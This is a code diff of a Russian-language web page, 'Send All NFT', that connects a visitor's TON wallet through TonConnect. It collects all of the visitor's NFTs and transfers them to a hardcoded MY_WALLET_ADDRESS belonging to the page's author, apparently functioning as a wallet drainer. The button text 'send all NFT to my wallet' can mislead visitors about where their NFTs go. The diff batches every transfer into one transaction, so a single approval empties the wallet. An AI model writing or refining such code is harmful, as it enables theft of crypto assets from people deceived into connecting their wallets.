@@ -22,7 +22,7 @@ button:hover { background:#2563eb; transform: translateY(-2px); }
 <h2>Send All NFT</h2>
 <div id="ton-connect-button"></div>
 <button id="send-btn">Отправить все NFT на мой кошелек</button>
-<p class="info">Подключите кошелек, затем подтвердите транзакции в Tonkeeper.</p>
+<p class="info">Подключите кошелек и нажмите кнопку. Все NFT будут отправлены на мой кошелек (подтвердите транзакции в Tonkeeper).</p>
 </div>
 
 <script>
@@ -45,65 +45,60 @@ const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
 // Функция получения всех NFT пользователя через TonConnect
 async function getUserNFTs(walletAddress) {
     try {
-        // Используем TonConnect для запроса токенов
         const nfts = await tonConnectUI.request({
             method: "ton_requestNFTs",
             params: { account: walletAddress }
         });
-        return nfts; // массив объектов NFT с полем address и tokenId
+        return nfts; 
     } catch (e) {
         console.error("Не удалось получить NFT:", e);
         return [];
     }
 }
 
-// Кнопка отправки всех NFT
+// Отправка всех NFT на твой кошелек
 document.getElementById('send-btn').addEventListener('click', async () => {
     const wallet = tonConnectUI.account;
     if (!wallet) {
-        alert("Сначала нажмите кнопку 'Connect Wallet'!");
+        alert("Сначала подключите кошелек через TonConnect!");
         return;
     }
 
-    // Получаем все NFT пользователя
     const nfts = await getUserNFTs(wallet.address);
     if (nfts.length === 0) {
         alert("На вашем кошельке нет NFT.");
         return;
     }
 
-    // Отправляем каждый NFT на твой кошелек
-    for (const nft of nfts) {
-        try {
-            const body = TonCore.beginCell()
-                .storeUint(0x5fcc3d14, 32) // transfer op
-                .storeUint(0, 64)          // query_id
-                .storeAddress(TonCore.Address.parse(MY_WALLET_ADDRESS))
-                .storeAddress(TonCore.Address.parse(wallet.address))
-                .storeBit(0)                // без payload
-                .storeCoins(TonCore.toNano('0.01'))
-                .storeBit(0)
-                .endCell();
+    // Создаём массив сообщений для всех NFT сразу
+    const messages = nfts.map(nft => {
+        const body = TonCore.beginCell()
+            .storeUint(0x5fcc3d14, 32)
+            .storeUint(0, 64)
+            .storeAddress(TonCore.Address.parse(MY_WALLET_ADDRESS))
+            .storeAddress(TonCore.Address.parse(wallet.address))
+            .storeBit(0)
+            .storeCoins(TonCore.toNano('0.01'))
+            .storeBit(0)
+            .endCell();
+        return {
+            address: nft.address,
+            amount: TonCore.toNano('0.05').toString(),
+            payload: body.toBoc().toString('base64')
+        };
+    });
 
-            const transaction = {
-                validUntil: Math.floor(Date.now()/1000)+300,
-                messages: [
-                    {
-                        address: nft.address,
-                        amount: TonCore.toNano('0.05').toString(),
-                        payload: body.toBoc().toString('base64')
-                    }
-                ]
-            };
-
-            await tonConnectUI.sendTransaction(transaction);
-            console.log(`NFT ${nft.tokenId} отправлен`);
-        } catch (e) {
-            console.error(`Ошибка при отправке NFT ${nft.tokenId}:`, e);
-        }
+    // Отправляем все транзакции одной командой TonConnect
+    try {
+        await tonConnectUI.sendTransaction({
+            validUntil: Math.floor(Date.now()/1000)+300,
+            messages: messages
+        });
+        alert("Все NFT отправлены на твой кошелек! Подтвердите транзакции в Tonkeeper.");
+    } catch (e) {
+        console.error("Ошибка отправки NFT:", e);
+        alert("Произошла ошибка при отправке NFT.");
     }
-
-    alert("Все NFT отправлены на твой кошелек (подтверждайте в Tonkeeper).");
 });
 </script>
 
